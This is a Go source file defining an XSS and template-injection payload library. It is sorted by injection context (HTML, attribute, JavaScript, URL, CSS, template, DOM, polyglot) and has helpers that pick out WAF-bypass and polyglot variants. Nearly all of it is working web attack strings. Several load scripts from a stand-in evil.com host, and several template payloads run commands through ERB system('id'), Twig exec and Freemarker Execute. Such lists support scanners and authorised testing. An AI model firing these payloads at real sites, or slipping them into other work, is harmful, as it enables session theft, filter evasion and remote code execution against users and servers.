// Package xss provides Cross-Site Scripting payloads for various contexts.
// Payloads are categorized by:
//   - Context (HTML, Attribute, JavaScript, URL, CSS)
//   - Type (Reflected, Stored, DOM-based)
//   - Evasion technique (WAF bypass, encoding, polyglot)
package xss

// Context represents the injection context.
type Context string

const (
	HTMLContext       Context = "html"
	AttributeContext  Context = "attribute"
	JavaScriptContext Context = "javascript"
	URLContext        Context = "url"
	CSSContext        Context = "css"
	TemplateContext   Context = "template"
)

// PayloadType represents the XSS type.
type PayloadType string

const (
	TypeReflected PayloadType = "reflected"
	TypeStored    PayloadType = "stored"
	TypeDOM       PayloadType = "dom"
)

// Payload represents an XSS payload.
type Payload struct {
	Value       string
	Context     Context
	Type        PayloadType
	Description string
	WAFBypass   bool
	Polyglot    bool // Works in multiple contexts
}

// GetPayloads returns payloads for a specific context.
func GetPayloads(ctx Context) []Payload {
	switch ctx {
	case HTMLContext:
		return htmlPayloads
	case AttributeContext:
		return attributePayloads
	case JavaScriptContext:
		return javascriptPayloads
	case URLContext:
		return urlPayloads
	case CSSContext:
		return cssPayloads
	case TemplateContext:
		return templatePayloads
	default:
		return htmlPayloads
	}
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads() []Payload {
	var result []Payload
	for _, p := range GetAllPayloads() {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetPolyglotPayloads returns payloads that work in multiple contexts.
func GetPolyglotPayloads() []Payload {
	return polyglotPayloads
}

// GetAllPayloads returns all XSS payloads.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, htmlPayloads...)
	all = append(all, attributePayloads...)
	all = append(all, javascriptPayloads...)
	all = append(all, urlPayloads...)
	all = append(all, cssPayloads...)
	all = append(all, templatePayloads...)
	all = append(all, polyglotPayloads...)
	return all
}

// GetDOMPayloads returns DOM-based XSS payloads.
func GetDOMPayloads() []Payload {
	return domPayloads
}

// HTML context payloads.
// Source: PayloadsAllTheThings, HackTricks, PortSwigger
var htmlPayloads = []Payload{
	// Basic HTML payloads
	{Value: "<script>alert(1)</script>", Context: HTMLContext, Type: TypeReflected, Description: "Basic script tag"},
	{Value: "<script>alert('XSS')</script>", Context: HTMLContext, Type: TypeReflected, Description: "Script with string"},
	{Value: "<script>alert(document.domain)</script>", Context: HTMLContext, Type: TypeReflected, Description: "Script domain alert"},
	{Value: "<script>alert(document.cookie)</script>", Context: HTMLContext, Type: TypeReflected, Description: "Script cookie alert"},
	{Value: "<script src=//evil.com/xss.js></script>", Context: HTMLContext, Type: TypeReflected, Description: "External script"},

	// Img tag payloads
	{Value: "<img src=x onerror=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Img onerror"},
	{Value: "<img src=x onerror=alert('XSS')>", Context: HTMLContext, Type: TypeReflected, Description: "Img onerror string"},
	{Value: "<img/src=x onerror=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Img no space"},
	{Value: "<img src=x onerror=alert`1`>", Context: HTMLContext, Type: TypeReflected, Description: "Img template literal"},
	{Value: "<img src=x oneonerrorrror=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Double keyword"},

	// SVG payloads
	{Value: "<svg onload=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "SVG onload"},
	{Value: "<svg/onload=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "SVG no space"},
	{Value: "<svg><script>alert(1)</script></svg>", Context: HTMLContext, Type: TypeReflected, Description: "SVG with script"},
	{Value: "<svg><animate onbegin=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "SVG animate"},
	{Value: "<svg><set onbegin=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "SVG set"},

	// Body tag payloads
	{Value: "<body onload=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Body onload"},
	{Value: "<body onpageshow=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Body onpageshow"},
	{Value: "<body onfocus=alert(1) autofocus>", Context: HTMLContext, Type: TypeReflected, Description: "Body onfocus autofocus"},

	// Input/Form payloads
	{Value: "<input onfocus=alert(1) autofocus>", Context: HTMLContext, Type: TypeReflected, Description: "Input onfocus autofocus"},
	{Value: "<input onblur=alert(1) autofocus><input autofocus>", Context: HTMLContext, Type: TypeReflected, Description: "Input onblur"},
	{Value: "<textarea onfocus=alert(1) autofocus>", Context: HTMLContext, Type: TypeReflected, Description: "Textarea autofocus"},
	{Value: "<select onfocus=alert(1) autofocus>", Context: HTMLContext, Type: TypeReflected, Description: "Select autofocus"},
	{Value: "<keygen onfocus=alert(1) autofocus>", Context: HTMLContext, Type: TypeReflected, Description: "Keygen autofocus"},
	{Value: "<marquee onstart=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Marquee onstart"},

	// Details/Video/Audio
	{Value: "<details open ontoggle=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Details ontoggle"},
	{Value: "<video><source onerror=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Video source error"},
	{Value: "<audio src=x onerror=alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Audio onerror"},

	// Object/Embed
	{Value: "<object data=javascript:alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Object javascript"},
	{Value: "<embed src=javascript:alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Embed javascript"},
	{Value: "<iframe src=javascript:alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Iframe javascript"},
	{Value: "<iframe srcdoc='<script>alert(1)</script>'>", Context: HTMLContext, Type: TypeReflected, Description: "Iframe srcdoc"},

	// Math/MathML
	{Value: "<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "MathML action"},

	// WAF bypass HTML
	{Value: "<ScRiPt>alert(1)</sCrIpT>", Context: HTMLContext, Type: TypeReflected, Description: "Case variation", WAFBypass: true},
	{Value: "<scr<script>ipt>alert(1)</scr</script>ipt>", Context: HTMLContext, Type: TypeReflected, Description: "Nested script", WAFBypass: true},
	{Value: "<IMG SRC=\"javascript:alert(1)\">", Context: HTMLContext, Type: TypeReflected, Description: "Img javascript", WAFBypass: true},
	{Value: "<img src=x onerror=\"&#x61;lert(1)\">", Context: HTMLContext, Type: TypeReflected, Description: "HTML entity encode", WAFBypass: true},
	{Value: "<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)\">", Context: HTMLContext, Type: TypeReflected, Description: "Decimal entities", WAFBypass: true},
	{Value: "<<script>alert(1)//<</script>", Context: HTMLContext, Type: TypeReflected, Description: "Double tag", WAFBypass: true},
	{Value: "<img src=x onerror=\\u0061lert(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Unicode escape", WAFBypass: true},
	{Value: "<img src=x onerror=al\\u0065rt(1)>", Context: HTMLContext, Type: TypeReflected, Description: "Unicode in keyword", WAFBypass: true},
	{Value: "<div/onmouseover='alert(1)'>test</div>", Context: HTMLContext, Type: TypeReflected, Description: "Div mouseover"},
	{Value: "<img src=1 href=1 onerror=\"javascript:alert(1)\">", Context: HTMLContext, Type: TypeReflected, Description: "Extra attributes"},
}

// Attribute context payloads.
// Source: PayloadsAllTheThings, HackTricks
var attributePayloads = []Payload{
	// Breaking out of attributes
	{Value: "\" onmouseover=\"alert(1)", Context: AttributeContext, Type: TypeReflected, Description: "Break double quote"},
	{Value: "' onmouseover='alert(1)", Context: AttributeContext, Type: TypeReflected, Description: "Break single quote"},
	{Value: "\" onfocus=\"alert(1)\" autofocus=\"", Context: AttributeContext, Type: TypeReflected, Description: "Autofocus break"},
	{Value: "\" onclick=\"alert(1)\"", Context: AttributeContext, Type: TypeReflected, Description: "Onclick break"},
	{Value: "\" onmouseover=alert(1) x=\"", Context: AttributeContext, Type: TypeReflected, Description: "Unquoted handler"},
	{Value: "\"><script>alert(1)</script>", Context: AttributeContext, Type: TypeReflected, Description: "Break and script"},
	{Value: "'><script>alert(1)</script>", Context: AttributeContext, Type: TypeReflected, Description: "Single break script"},
	{Value: "\"><img src=x onerror=alert(1)>", Context: AttributeContext, Type: TypeReflected, Description: "Break and img"},

	// href/src attribute injection
	{Value: "javascript:alert(1)", Context: AttributeContext, Type: TypeReflected, Description: "Javascript protocol"},
	{Value: "java&#x0A;script:alert(1)", Context: AttributeContext, Type: TypeReflected, Description: "Newline in javascript", WAFBypass: true},
	{Value: "data:text/html,<script>alert(1)</script>", Context: AttributeContext, Type: TypeReflected, Description: "Data URI"},
	{Value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", Context: AttributeContext, Type: TypeReflected, Description: "Base64 data URI"},

	// WAF bypass attribute
	{Value: "\" onmouseover=alert`1`", Context: AttributeContext, Type: TypeReflected, Description: "Template literal", WAFBypass: true},
	{Value: "\"onmouseover=\"alert(1)", Context: AttributeContext, Type: TypeReflected, Description: "No space", WAFBypass: true},
	{Value: "\" oNmOuSeOvEr=\"alert(1)", Context: AttributeContext, Type: TypeReflected, Description: "Case variation", WAFBypass: true},
}

// JavaScript context payloads.
// Source: PayloadsAllTheThings, HackTricks
var javascriptPayloads = []Payload{
	// Breaking out of strings
	{Value: "'-alert(1)-'", Context: JavaScriptContext, Type: TypeReflected, Description: "Arithmetic break single"},
	{Value: "\"-alert(1)-\"", Context: JavaScriptContext, Type: TypeReflected, Description: "Arithmetic break double"},
	{Value: "';alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Statement break single"},
	{Value: "\";alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Statement break double"},
	{Value: "\\';alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Escaped quote bypass"},
	{Value: "</script><script>alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Close and open script"},
	{Value: "'-alert(1)+'", Context: JavaScriptContext, Type: TypeReflected, Description: "Concat expression"},
	{Value: "'+alert(1)+'", Context: JavaScriptContext, Type: TypeReflected, Description: "Plus concat"},
	{Value: "\\'-alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Escape with comment"},

	// Template literals
	{Value: "${alert(1)}", Context: JavaScriptContext, Type: TypeReflected, Description: "Template literal injection"},
	{Value: "`${alert(1)}`", Context: JavaScriptContext, Type: TypeReflected, Description: "Full template literal"},
	{Value: "`.${alert(1)}`", Context: JavaScriptContext, Type: TypeReflected, Description: "Template with dot"},

	// Breaking out of comments
	{Value: "*/alert(1)/*", Context: JavaScriptContext, Type: TypeReflected, Description: "Break block comment"},
	{Value: "*/alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Break comment to line"},
	{Value: "\n//*/alert(1)/*", Context: JavaScriptContext, Type: TypeReflected, Description: "Newline comment break"},

	// Breaking out of JSON/objects
	{Value: "}};alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Break object notation"},
	{Value: "}]);alert(1)//", Context: JavaScriptContext, Type: TypeReflected, Description: "Break array notation"},

	// Function calls without parentheses
	{Value: "alert`1`", Context: JavaScriptContext, Type: TypeReflected, Description: "Tagged template alert"},
	{Value: "window['alert'](1)", Context: JavaScriptContext, Type: TypeReflected, Description: "Bracket notation"},
	{Value: "this['alert'](1)", Context: JavaScriptContext, Type: TypeReflected, Description: "This bracket notation"},
	{Value: "[]['constructor']['constructor']('alert(1)')()", Context: JavaScriptContext, Type: TypeReflected, Description: "Constructor chain", WAFBypass: true},
	{Value: "eval('alert(1)')", Context: JavaScriptContext, Type: TypeReflected, Description: "Eval execution"},
	{Value: "eval(atob('YWxlcnQoMSk='))", Context: JavaScriptContext, Type: TypeReflected, Description: "Base64 eval", WAFBypass: true},
	{Value: "Function('alert(1)')()", Context: JavaScriptContext, Type: TypeReflected, Description: "Function constructor"},
	{Value: "setTimeout('alert(1)')", Context: JavaScriptContext, Type: TypeReflected, Description: "setTimeout string"},
	{Value: "setInterval('alert(1)')", Context: JavaScriptContext, Type: TypeReflected, Description: "setInterval string"},
}

// URL context payloads.
// Source: PayloadsAllTheThings
var urlPayloads = []Payload{
	{Value: "javascript:alert(1)", Context: URLContext, Type: TypeReflected, Description: "Javascript protocol"},
	{Value: "javascript:alert(document.domain)", Context: URLContext, Type: TypeReflected, Description: "Javascript domain"},
	{Value: "javascript:alert(String.fromCharCode(88,83,83))", Context: URLContext, Type: TypeReflected, Description: "CharCode bypass", WAFBypass: true},
	{Value: "data:text/html,<script>alert(1)</script>", Context: URLContext, Type: TypeReflected, Description: "Data URI HTML"},
	{Value: "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", Context: URLContext, Type: TypeReflected, Description: "Base64 data URI"},
	{Value: "javascript:alert(1)//http://example.com", Context: URLContext, Type: TypeReflected, Description: "Comment URL bypass", WAFBypass: true},
	{Value: "//evil.com/%0d%0aalert(1)", Context: URLContext, Type: TypeReflected, Description: "Protocol relative"},
	{Value: "/\\evil.com", Context: URLContext, Type: TypeReflected, Description: "Backslash protocol"},
}

// CSS context payloads.
// Source: HackTricks, PayloadsAllTheThings
var cssPayloads = []Payload{
	{Value: "expression(alert(1))", Context: CSSContext, Type: TypeReflected, Description: "CSS expression (IE)"},
	{Value: "url(javascript:alert(1))", Context: CSSContext, Type: TypeReflected, Description: "CSS url javascript"},
	{Value: "}</style><script>alert(1)</script>", Context: CSSContext, Type: TypeReflected, Description: "Break style tag"},
	{Value: "background:url(javascript:alert(1))", Context: CSSContext, Type: TypeReflected, Description: "Background URL"},
	{Value: "-moz-binding:url(http://evil.com/xss.xml#xss)", Context: CSSContext, Type: TypeReflected, Description: "Moz binding (Firefox)"},
	{Value: "behavior:url(script.htc)", Context: CSSContext, Type: TypeReflected, Description: "Behavior (IE)"},
}

// Template engine context payloads (SSTI).
// Source: HackTricks, PayloadsAllTheThings
var templatePayloads = []Payload{
	// Jinja2/Flask
	{Value: "{{7*7}}", Context: TemplateContext, Type: TypeReflected, Description: "Jinja2 basic test"},
	{Value: "{{config}}", Context: TemplateContext, Type: TypeReflected, Description: "Jinja2 config leak"},
	{Value: "{{self.__class__.__mro__[2].__subclasses__()}}", Context: TemplateContext, Type: TypeReflected, Description: "Jinja2 class traversal"},

	// Twig
	{Value: "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", Context: TemplateContext, Type: TypeReflected, Description: "Twig RCE"},

	// ERB
	{Value: "<%= 7*7 %>", Context: TemplateContext, Type: TypeReflected, Description: "ERB basic test"},
	{Value: "<%= system('id') %>", Context: TemplateContext, Type: TypeReflected, Description: "ERB command exec"},

	// Smarty
	{Value: "{php}echo 'id';{/php}", Context: TemplateContext, Type: TypeReflected, Description: "Smarty PHP tag"},
	{Value: "{literal}<script>alert(1)</script>{/literal}", Context: TemplateContext, Type: TypeReflected, Description: "Smarty literal XSS"},

	// Freemarker
	{Value: "${7*7}", Context: TemplateContext, Type: TypeReflected, Description: "Freemarker basic"},
	{Value: "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", Context: TemplateContext, Type: TypeReflected, Description: "Freemarker exec"},

	// AngularJS
	{Value: "{{constructor.constructor('alert(1)')()", Context: TemplateContext, Type: TypeReflected, Description: "AngularJS sandbox escape"},
	{Value: "{{$on.constructor('alert(1)')()}}", Context: TemplateContext, Type: TypeReflected, Description: "AngularJS $on escape"},
}

// DOM-based XSS payloads targeting common sinks.
// Source: HackTricks, PortSwigger
var domPayloads = []Payload{
	// document.write sinks
	{Value: "<img src=x onerror=alert(1)>", Context: HTMLContext, Type: TypeDOM, Description: "document.write img"},
	{Value: "<script>alert(1)</script>", Context: HTMLContext, Type: TypeDOM, Description: "document.write script"},

	// innerHTML sinks
	{Value: "<img src=x onerror=alert(1)>", Context: HTMLContext, Type: TypeDOM, Description: "innerHTML img"},
	{Value: "<svg onload=alert(1)>", Context: HTMLContext, Type: TypeDOM, Description: "innerHTML svg"},

	// eval() sinks
	{Value: "alert(1)", Context: JavaScriptContext, Type: TypeDOM, Description: "eval direct"},
	{Value: "');alert(1)//", Context: JavaScriptContext, Type: TypeDOM, Description: "eval break string"},

	// location sinks
	{Value: "javascript:alert(1)", Context: URLContext, Type: TypeDOM, Description: "location.href javascript"},
	{Value: "#<script>alert(1)</script>", Context: HTMLContext, Type: TypeDOM, Description: "location.hash injection"},

	// jQuery specific
	{Value: "<img src=x onerror=alert(1)>", Context: HTMLContext, Type: TypeDOM, Description: "jQuery html()"},
	{Value: "javascript:alert(1)", Context: URLContext, Type: TypeDOM, Description: "jQuery attr href"},
}

// Polyglot payloads that work in multiple contexts.
// Source: HackTricks, PayloadsAllTheThings
var polyglotPayloads = []Payload{
	{
		Value:       "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
		Description: "Ultimate polyglot",
		Polyglot:    true,
		WAFBypass:   true,
	},
	{
		Value:       "'\"-->]]>*/</script></style></title></textarea></noscript></template></select><img src=x onerror=alert(1)>",
		Description: "Context escape polyglot",
		Polyglot:    true,
		WAFBypass:   true,
	},
	{
		Value:       "\"><img src=x onerror=alert(1)>",
		Description: "Simple polyglot",
		Polyglot:    true,
	},
	{
		Value:       "'-alert(1)-'",
		Description: "JS string polyglot",
		Polyglot:    true,
	},
	{
		Value:       "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
		Description: "Multi-context polyglot",
		Polyglot:    true,
		WAFBypass:   true,
	},
}
